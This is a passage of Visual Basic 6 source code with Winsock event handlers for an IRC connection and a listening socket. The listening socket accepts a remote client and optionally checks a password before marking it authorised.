        modIRC.ParseString (Lines(i))
NextLine:
    Next i
    
End Sub

Private Sub wskIRC_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    modIRC.InChannel = False
    wskIRC.Close
    tmrIrc_Timer
End Sub

Private Sub wskListen_ConnectionRequest(ByVal requestID As Long)
    If wskInfo.State <> sckConnected Then
        wskInfo.Close
        wskInfo.Accept requestID
        ChangeStats , , True, False, wskInfo.RemoteHostIP, "Connected"
        
        If PasswordProtected = True Then
            modMain.GetAuthorisation
        Else
            Authorised = True
        End If
        
    Else
        wskListen.Close
        wskListen.LocalPort = ListenPort
        wskListen.Listen
    End If
End Sub

